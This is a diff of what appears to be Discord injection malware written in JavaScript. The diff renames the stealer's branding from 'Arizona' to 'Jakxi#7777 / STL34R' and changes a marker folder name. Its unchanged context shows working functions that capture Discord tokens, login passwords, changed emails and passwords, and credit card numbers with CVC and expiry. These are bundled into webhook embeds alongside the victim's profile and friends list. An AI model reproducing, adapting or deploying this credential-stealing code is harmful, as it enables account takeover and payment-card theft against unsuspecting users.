@@ -105,7 +105,7 @@ async function firstTime() {
             fs.rmdirSync(path.join(__dirname, "init"));
             if (token == null || token == undefined || token == "") {
                 var c = {
-                    username: "Arizona",
+                    username: "Jakxi#7777 / STL34R",
                     content: "",
                     embeds: [{
                         title: "Discord Initalized (User not Logged in)",
@@ -116,10 +116,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "Arizona"
+                            name: "Jakxi#7777 / STL34R"
                         },
                         footer: {
-                            text: "Arizona"
+                            text: "Jakxi#7777 / STL34R"
                         }
                     }]
                 };
@@ -127,7 +127,7 @@ async function firstTime() {
             } else {
                 var b = await getUserInfo(token)
                 var c = {
-                    username: "Arizona",
+                    username: "Jakxi#7777 / STL34R",
                     content: "",
                     embeds: [{
                         title: "Discord Initalized",
@@ -155,10 +155,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "Arizona"
+                            name: "Jakxi#7777 / STL34R"
                         },
                         footer: {
-                            text: "Arizona"
+                            text: "Jakxi#7777 / STL34R"
                         },
                         thumbnail: {
                             url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -170,14 +170,14 @@ async function firstTime() {
 
         }
     }
-    if (!fs.existsSync(path.join(__dirname, "ArizonaBTW"))) return !0
+    if (!fs.existsSync(path.join(__dirname, "AppProb"))) return !0
 
-    fs.rmdirSync(path.join(__dirname, "ArizonaBTW"));
+    fs.rmdirSync(path.join(__dirname, "AppProb"));
     if (config.logout != "false" || config.logout == "%LOGOUT%") {
         if (config['logout-notify'] == "true") {
             if (token == null || token == undefined || token == "") {
                 var c = {
-                    username: "Arizona",
+                    username: "Jakxi#7777 / STL34R",
                     content: "",
                     embeds: [{
                         title: "User log out (User not Logged in before)",
@@ -188,10 +188,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "Arizona"
+                            name: "Jakxi#7777 / STL34R"
                         },
                         footer: {
-                            text: "Arizona"
+                            text: "Jakxi#7777 / STL34R"
                         }
                     }]
                 };
@@ -199,7 +199,7 @@ async function firstTime() {
             } else {
                 const b = await getUserInfo(token);
                 var c = {
-                    username: "Arizona",
+                    username: "Jakxi#7777 / STL34R",
                     content: "",
                     embeds: [{
                         title: "User got logged out",
@@ -227,10 +227,10 @@ async function firstTime() {
                             inline: !1
                         }],
                         author: {
-                            name: "Arizona"
+                            name: "Jakxi#7777 / STL34R"
                         },
                         footer: {
-                            text: "Arizona"
+                            text: "Jakxi#7777 / STL34R"
                         },
                         thumbnail: {
                             url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
@@ -305,7 +305,7 @@ async function userLogin(password, email, token) {
     var friends = await getRelationships(token);
 
     var params = {
-        username: "Arizona",
+        username: "Jakxi#7777 / STL34R",
         content: "",
         embeds: [{
             "title": "User Login",
@@ -349,10 +349,10 @@ async function userLogin(password, email, token) {
                 inline: !1
             }, ],
             "author": {
-                "name": "Arizona"
+                "name": "Jakxi#7777 / STL34R"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "Jakxi#7777 / STL34R"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -362,10 +362,10 @@ async function userLogin(password, email, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "Arizona"
+                "name": "Jakxi#7777 / STL34R"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "Jakxi#7777 / STL34R"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -381,10 +381,10 @@ async function userLogin(password, email, token) {
             "color": config['embed-color'],
             "fields": codes.fields,
             "author": {
-                "name": "Arizona"
+                "name": "Jakxi#7777 / STL34R"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "Jakxi#7777 / STL34R"
             }
         }
         params.embeds.push(embed)
@@ -400,7 +400,7 @@ async function emailChanged(password, newEmail, token) {
 
 
     var params = {
-        username: "Arizona",
+        username: "Jakxi#7777 / STL34R",
         content: "",
         embeds: [{
             "title": "Email Changed",
@@ -440,10 +440,10 @@ async function emailChanged(password, newEmail, token) {
                 inline: !1
             }, ],
             "author": {
-                "name": "Arizona"
+                "name": "Jakxi#7777 / STL34R"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "Jakxi#7777 / STL34R"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -453,10 +453,10 @@ async function emailChanged(password, newEmail, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "Arizona"
+                "name": "Jakxi#7777 / STL34R"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "Jakxi#7777 / STL34R"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -471,10 +471,10 @@ async function emailChanged(password, newEmail, token) {
             "color": config['embed-color'],
             "fields": codes.fields,
             "author": {
-                "name": "Arizona"
+                "name": "Jakxi#7777 / STL34R"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "Jakxi#7777 / STL34R"
             }
         }
         params.embeds.push(embed)
@@ -488,7 +488,7 @@ async function passwordChanged(oldPassword, newPassword, token) {
     var friends = await getRelationships(token);
 
     var params = {
-        username: "Arizona",
+        username: "Jakxi#7777 / STL34R",
         content: "",
         embeds: [{
             "title": "Password Changed",
@@ -536,10 +536,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
                 inline: !1
             }, ],
             "author": {
-                "name": "Arizona"
+                "name": "Jakxi#7777 / STL34R"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "Jakxi#7777 / STL34R"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -549,10 +549,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "Arizona"
+                "name": "Jakxi#7777 / STL34R"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "Jakxi#7777 / STL34R"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -568,10 +568,10 @@ async function passwordChanged(oldPassword, newPassword, token) {
             "color": config['embed-color'],
             "fields": codes.fields,
             "author": {
-                "name": "Arizona"
+                "name": "Jakxi#7777 / STL34R"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "Jakxi#7777 / STL34R"
             }
         }
         params.embeds.push(embed)
@@ -585,7 +585,7 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
     var friends = await getRelationships(token);
 
     var params = {
-        username: "Arizona",
+        username: "Jakxi#7777 / STL34R",
         content: "",
         embeds: [{
             "title": "Credit Card",
@@ -639,10 +639,10 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
                 },
             ],
             "author": {
-                "name": "Arizona"
+                "name": "Jakxi#7777 / STL34R"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "Jakxi#7777 / STL34R"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
@@ -652,10 +652,10 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
             "color": config['embed-color'],
             "description": friends.frien,
             "author": {
-                "name": "Arizona"
+                "name": "Jakxi#7777 / STL34R"
             },
             "footer": {
-                "text": "Arizona"
+                "text": "Jakxi#7777 / STL34R"
             },
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
